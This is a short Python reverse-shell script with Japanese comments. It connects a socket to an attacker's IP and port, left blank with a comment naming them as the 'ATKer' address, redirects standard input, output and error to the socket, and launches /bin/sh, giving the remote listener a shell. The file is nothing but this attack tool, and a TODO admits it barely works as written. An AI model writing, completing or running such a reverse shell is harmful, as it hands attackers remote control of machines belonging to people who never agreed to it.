import socket
import os
import subprocess

# リバースシェル
# TODO このままだとほぼ使い物にならない

ip = ""
port = ""

#rev shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("",)) #ATKer IP add,ATKer port
s.connect((ip,port))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

# which sh
p = subprocess.call(["/bin/sh"])
